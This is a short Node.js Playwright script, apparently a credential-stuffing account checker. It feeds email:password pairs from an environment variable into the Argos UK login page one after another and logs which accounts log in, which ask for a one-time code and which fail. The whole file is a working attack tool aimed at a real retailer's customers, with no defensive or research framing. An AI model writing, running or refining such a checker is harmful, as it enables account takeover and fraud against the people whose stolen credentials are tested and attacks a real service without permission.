// runner.js
const { chromium } = require('playwright');

function parseLine(line) {
  const match = line.match(
    /([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}):([^\s]+)/
  );
  if (!match) return null;
  return { email: match[1], password: match[2] };
}

if (!process.env.LOGINS) {
  console.log('❌ No LOGINS received');
  process.exit(0);
}

const LOGIN_URL = 'https://www.argos.co.uk/login';
const logins = process.env.LOGINS.split('\n').filter(Boolean);

(async () => {
  if (!process.env.LOGINS) {
    console.log('❌ No logins received');
    return;
  }

  const browser = await chromium.launch({ headless: true });

  let ok = 0;
  let fail = 0;

  for (const line of logins) {
    const parsed = parseLine(line);
    if (!parsed) {
      console.log('SKIPPED:', line);
      continue;
    }

    const { email, password } = parsed;
    console.log(`➡️ Trying ${email}`);

    const context = await browser.newContext();
    const page = await context.newPage();

    try {
      await page.goto(LOGIN_URL, { waitUntil: 'domcontentloaded' });

      await page.fill('input[type="email"]', email);
      await page.fill('input[type="password"]', password);
      await page.click('button:has-text("Sign in securely")');

      await page.waitForTimeout(3000);

      const stillHasForm = await page.$('input[type="email"]');
      const pageText = await page.textContent('body');

      if (!stillHasForm) {
        console.log(`✅ ${email} (logged in)`);
        ok++;
      } else if (pageText && /code|otp|verify/i.test(pageText)) {
        console.log(`⚠️ ${email} (OTP required)`);
        fail++;
      } else if (pageText && /incorrect|invalid|wrong/i.test(pageText)) {
        console.log(`❌ ${email} (invalid credentials)`);
        fail++;
      } else {
        console.log(`❌ ${email} (login did not complete)`);
        fail++;
      }
    } catch (err) {
      console.log(`❌ ${email} (exception)`);
      fail++;
    } finally {
      await context.close(); // 🔑 IMPORTANT
    }

    await page.waitForTimeout(1500);
  }

  console.log(`\nRESULTS`);
  console.log(`OK: ${ok}`);
  console.log(`FAIL: ${fail}`);

  await browser.close();
})();